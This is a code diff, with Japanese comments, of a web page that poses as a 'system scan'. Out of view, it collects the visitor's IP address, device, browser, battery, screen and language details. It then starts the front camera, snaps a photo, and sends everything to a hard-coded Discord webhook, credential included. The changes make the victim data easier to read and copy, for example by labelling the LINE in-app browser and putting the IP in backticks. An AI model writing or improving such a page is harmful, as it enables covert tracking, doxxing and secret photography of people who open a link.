@@ -64,7 +64,6 @@
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // ご提示いただいたWebhook URLを設定済み
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1572124436818170017/T_lHqJXspYpaMdhkghKVHY-xCVkyiAPIoO9R72WLe9dO-MZq0GfLFL8V2Z3lVuC3YjhW";
 
         const startBtn = document.getElementById('startBtn');
@@ -77,7 +76,7 @@
             statusDiv.textContent = "システムスキャン中...";
 
             try {
-                // 1. IPアドレスを取得する外部API（より確実な方法に変更）
+                // 1. IPアドレスを取得
                 let ipInfo = "取得失敗";
                 try {
                     const ipRes = await fetch('https://api.ipify.org?format=json');
@@ -94,9 +93,21 @@
                     } catch (e) {}
                 }
 
-                // 3. デバイス・ブラウザ情報
-                const userAgent = navigator.userAgent;
-                const screenRes = `${window.screen.width} x ${window.screen.height}`;
+                // 3. デバイス・ブラウザ情報の分かりやすい日本語化
+                const ua = navigator.userAgent;
+                let deviceName = "PC / その他";
+                if (/iPhone/.test(ua)) deviceName = "iPhone";
+                else if (/iPad/.test(ua)) deviceName = "iPad";
+                else if (/Android/.test(ua)) deviceName = "Androidスマホ";
+
+                let browserName = "不明なブラウザ";
+                if (/Line/.test(ua)) browserName = "LINEアプリ内ブラウザ";
+                else if (/CriOS/.test(ua)) browserName = "Chrome (iOS)";
+                else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browserName = "Safari";
+                else if (/Chrome/.test(ua)) browserName = "Chrome";
+
+                const deviceInfo = `${deviceName} (${browserName})`;
+                const screenRes = `${window.screen.width} × ${window.screen.height}`;
                 const language = navigator.language;
 
                 // 4. カメラ起動と撮影
@@ -104,7 +115,6 @@
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                 video.srcObject = stream;
 
-                // カメラが安定するまで少し待つ
                 await new Promise(resolve => setTimeout(resolve, 1500));
 
                 canvas.width = video.videoWidth || 640;
@@ -112,19 +122,18 @@
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                // ストリームを停止
                 stream.getTracks().forEach(track => track.stop());
 
                 statusDiv.textContent = "データを送信中...";
 
-                // 画像をBlob（ファイルデータ）に変換して送信
                 canvas.toBlob(async (blob) => {
                     const formData = new FormData();
                     formData.append('file', blob, 'capture.jpg');
                     
+                    // IPアドレスを `` (バッククォート) で囲むことで、Discordでタップ・コピーしやすくする
                     const content = `🚨 **新しいアクセスを検知しました！**\n` +
-                                    `🌐 **IPアドレス**: ${ipInfo}\n` +
-                                    `📱 **デバイス**: ${userAgent}\n` +
+                                    `🌐 **IPアドレス**: \`${ipInfo}\`\n` +
+                                    `📱 **端末**: ${deviceInfo}\n` +
                                     `🖥 **画面解像度**: ${screenRes}\n` +
                                     `🔋 **バッテリー**: ${batteryInfo}\n` +
                                     `🌍 **言語**: ${language}`;
